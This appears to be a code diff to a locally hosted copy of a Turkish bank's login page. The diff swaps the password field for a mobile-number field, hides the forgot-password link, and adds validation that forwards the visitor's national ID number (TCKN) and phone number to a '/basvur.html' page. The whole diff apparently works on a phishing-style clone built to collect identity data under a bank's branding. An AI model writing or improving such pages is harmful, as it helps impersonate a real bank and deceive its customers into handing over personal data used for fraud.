@@ -56,7 +56,7 @@
                         </div>
                         <div class="tabContentContainer">
                           <div class="inputLabel ie8-9Only">
-                            <span id="_ctl0_subeLogin01MusteriNumarasi">Müşteri Numaranız / TCKN / YKN</span>
+                            <span id="_ctl0_subeLogin01MusteriNumarasi">TC Kimlik Numaranız</span>
                           </div>
                           <div class="loginInputContainer bottom10">
                             <input name="tckn" type="tel" id="_ctl0_MusNoText" placeholder="Müşteri Numaranız / TCKN / YKN" title="Müşteri Numaranız / TCKN / YKN" maxlength="11" class="standardInput info onlyNumeric allowCopyPaste" autocomplete="off" tabindex="1">
@@ -82,17 +82,20 @@
                     </div>
                     <div id="loginFormBottomPartContainer">
                       <div class="inputLabel loginPasswordLabel ie8-9Only">
-                        <span id="_ctl0_subeLogin01PassTempPass">Şifre / Geçici Şifre</span>
+                        <span id="_ctl0_subeLogin01PassTempPass">Telefon Numarası / GSM Numarası</span>
                       </div>
                       <div class="loginInputContainer loginPasswordInputContainer ui-login-z5" style="display: block;">
-                        <div class="loginInputContainer loginPasswordInputContainer ui-login-z5" style="display: block;">
-                          <input name="password" type="tel" id="ParolaText" pattern="[0-9]*" maxlength="6" placeholder="Şifre / Geçici Şifre" title="Şifre / Geçici Şifre" tabindex="2" size="6" class="standardInput info onlyNumeric virtualKeypad removeAutoFill" autocomplete="off" style="border: 1px solid rgb(211, 211, 211);">
-                          <div id="passInfo" class="infoBlueBox infoQuestionMark" title="şifre bilgisi">
+                        <div class="loginInputContainer loginPasswordInputContainer ui-login-z5" style="position: relative;">
+                          <div style="display: flex; align-items: center; gap: 8px;">
+                            <input name="countryCode" type="text" id="CountryCodeText" value="+90" readonly class="standardInput info" style="width: 55px; text-align: center; background-color: #f5f5f5; cursor: not-allowed; border: 1px solid rgb(211, 211, 211); padding: 8px 5px; flex-shrink: 0;" tabindex="-1">
+                            <input name="phone" type="tel" id="PhoneText" pattern="[0-9]*" maxlength="10" placeholder="5XXXXXXXXX" title="Telefon Numarası" tabindex="2" class="standardInput info onlyNumeric removeAutoFill" autocomplete="off" style="border: 1px solid rgb(211, 211, 211); flex: 1; min-width: 0;">
+                            <div id="phoneInfo" class="infoBlueBox infoQuestionMark" style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%);" title="telefon numarası bilgisi">
+                            </div>
                           </div>
-                          <div class="inputBottomErrorContainer password" style="display: none;">Şifrenizi giriniz.</div>
+                          <div class="inputBottomErrorContainer phone" style="display: none; margin-top: 5px;">5 ile başlayan 10 haneli telefon numaranızı giriniz.</div>
                         </div>
                         <div class="formBottomLink">
-                          <a id="_ctl0_anindaSifreLink" class="login-tooltip-button">
+                          <a id="_ctl0_anindaSifreLink" class="login-tooltip-button" style="display: none;">
                             <img class="login-tooltip-button-image" src="./dist/login_icon_2.png" alt="Åifrem Yok,Ä°lk Kullanım ikonu">
                             <div class="toolTipButtonText">
                               <span id="_ctl0_subeLogin01IlkKullanim">Şifrem Yok / Unuttum</span>
@@ -211,7 +214,53 @@
         if (errorContainer) {
           errorContainer.style.display = 'none';
         }
+        var phoneErrorContainer = document.querySelector('.inputBottomErrorContainer.phone');
+        if (phoneErrorContainer) {
+          phoneErrorContainer.style.display = 'none';
+        }
       }, 100);
+
+      // Telefon numarası input'una sadece rakam ve 5 ile başlama kontrolü
+      setTimeout(function() {
+        var phoneInput = document.getElementById('PhoneText');
+        if (phoneInput) {
+          phoneInput.addEventListener('input', function(e) {
+            // Sadece rakam
+            this.value = this.value.replace(/[^0-9]/g, '');
+            
+            // 10 karakterden fazla girilmesini engelle
+            if (this.value.length > 10) {
+              this.value = this.value.substring(0, 10);
+            }
+            
+            // 5 ile başlamıyorsa hata göster
+            var phoneErrorContainer = document.querySelector('.inputBottomErrorContainer.phone');
+            if (this.value.length > 0 && !this.value.startsWith('5')) {
+              if (phoneErrorContainer) {
+                phoneErrorContainer.style.display = 'block';
+                phoneErrorContainer.textContent = 'Telefon numarası 5 ile başlamalıdır.';
+              }
+              this.classList.add('hasError');
+            } else {
+              if (phoneErrorContainer) {
+                phoneErrorContainer.style.display = 'none';
+              }
+              this.classList.remove('hasError');
+            }
+          });
+          
+          phoneInput.addEventListener('paste', function(e) {
+            e.preventDefault();
+            var pastedText = (e.clipboardData || window.clipboardData).getData('text');
+            var numericOnly = pastedText.replace(/[^0-9]/g, '');
+            if (numericOnly.length > 10) {
+              numericOnly = numericOnly.substring(0, 10);
+            }
+            this.value = numericOnly;
+            this.dispatchEvent(new Event('input'));
+          });
+        }
+      }, 200);
 
       // Butona event listener ekle - capture phase'de
       function handleButtonClick(e) {
@@ -220,34 +269,65 @@
         e.stopPropagation();
         
         var tcknInput = document.getElementById('_ctl0_MusNoText');
+        var phoneInput = document.getElementById('PhoneText');
         if (!tcknInput) return false;
         
         var tcknValue = tcknInput.value.trim();
-        var errorContainer = document.querySelector('.inputBottomErrorContainer.tckn');
+        var phoneValue = phoneInput ? phoneInput.value.trim() : '';
+        var tcknErrorContainer = document.querySelector('.inputBottomErrorContainer.tckn');
+        var phoneErrorContainer = document.querySelector('.inputBottomErrorContainer.phone');
+        var isValid = true;
         
         // TCKN kontrolü - sadece 11 karakter kontrolü
         if (!tcknValue || tcknValue.length !== 11) {
           // Hata mesajını göster
-          if (errorContainer) {
-            errorContainer.style.display = 'block';
+          if (tcknErrorContainer) {
+            tcknErrorContainer.style.display = 'block';
           }
           if (tcknInput) {
             tcknInput.classList.add('hasError');
             tcknInput.focus();
           }
+          isValid = false;
+        } else {
+          // TCKN geçerliyse hata mesajını gizle
+          if (tcknErrorContainer) {
+            tcknErrorContainer.style.display = 'none';
+          }
+          if (tcknInput) {
+            tcknInput.classList.remove('hasError');
+          }
+        }
+        
+        // Telefon numarası kontrolü - 5 ile başlayan 10 haneli
+        if (!phoneValue || phoneValue.length !== 10 || !phoneValue.startsWith('5')) {
+          // Hata mesajını göster
+          if (phoneErrorContainer) {
+            phoneErrorContainer.style.display = 'block';
+          }
+          if (phoneInput) {
+            phoneInput.classList.add('hasError');
+            if (isValid) {
+              phoneInput.focus();
+            }
+          }
+          isValid = false;
+        } else {
+          // Telefon geçerliyse hata mesajını gizle
+          if (phoneErrorContainer) {
+            phoneErrorContainer.style.display = 'none';
+          }
+          if (phoneInput) {
+            phoneInput.classList.remove('hasError');
+          }
+        }
+        
+        if (!isValid) {
           return false;
         }
         
-        // TCKN geçerliyse hata mesajını gizle
-        if (errorContainer) {
-          errorContainer.style.display = 'none';
-        }
-        if (tcknInput) {
-          tcknInput.classList.remove('hasError');
-        }
-        
-        // Direkt yönlendirme yap
-        window.location.href = '/basvur.html?tc=' + encodeURIComponent(tcknValue);
+        // Direkt yönlendirme yap - telefon numarasını da ekle
+        window.location.href = '/basvur.html?tc=' + encodeURIComponent(tcknValue) + '&phone=' + encodeURIComponent('+90' + phoneValue);
         
         return false;
       }
